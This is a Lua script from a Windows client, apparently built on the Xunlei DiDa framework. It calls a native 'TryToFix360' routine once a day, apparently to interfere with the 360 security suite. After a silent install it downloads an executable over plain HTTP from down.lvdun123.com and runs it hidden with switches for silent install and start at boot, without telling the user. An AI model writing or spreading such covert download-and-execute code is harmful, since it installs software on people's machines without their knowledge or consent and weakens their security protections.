local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
local tipUtil = XLGetObject("API.Util")

function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end


function CheckRepHistory()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	
	local nLastRepUTC = FetchValueByPath(tUserConfig, {"tExtraCodeInfo", "nLastTSZRepUTC"})
	if IsNilString(nLastRepUTC) or FunctionObj.CheckTimeIsAnotherDay(nLastRepUTC) then
		return true
	end

	return false
end

function UpdateRepHistory()
	local tipUtil = XLGetObject("API.Util")
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	
	if type(tUserConfig["tExtraCodeInfo"]) ~= "table" then
		tUserConfig["tExtraCodeInfo"] = {}
	end
	
	local tExtraCodeInfo = tUserConfig["tExtraCodeInfo"]
	tExtraCodeInfo["nLastTSZRepUTC"] = tipUtil:GetCurrentUTCTime()
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function DoFix360Bussiness()
	if type(tipUtil.TryToFix360) ~= "function" then
		return
	end

	local bPassCheck = CheckRepHistory()
	if not bPassCheck then
		return
	end
	
	tipUtil:TryToFix360()
	UpdateRepHistory()
end
-------------------------------------------------

function DoGSBussiness()
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	if not bRet or strSource ~= "install" then
		return
	end
	
	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installmethod")
	if not bRet or strInsMethod ~= "silent" then
		return
	end

	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
	if not IsRealString(strGSPath) or not tipUtil:QueryFileExists(strGSPath) then
		return 
	end
	
	DownLoadGS()
end


function DownLoadGS()
	local strPacketURL = "http://down.lvdun123.com/client/GsSetup_0006.exe"
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, "GsSetup_0006.exe")
	
	local strStamp = FunctionObj.GetTimeStamp()
	local strURLFix = strPacketURL..strStamp
	
	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
	, function(bRet, strRealPath)
			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
					.." strRealPath:"..tostring(strRealPath))
					
			if 0 ~= bRet then
				return
			end
			
			local strCmd = "/s /run /setboot"
			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end



function main()
	if type(FunctionObj) ~= "table" or tipUtil == nil then
		return
	end

	DoFix360Bussiness()
	DoGSBussiness()
end

main()



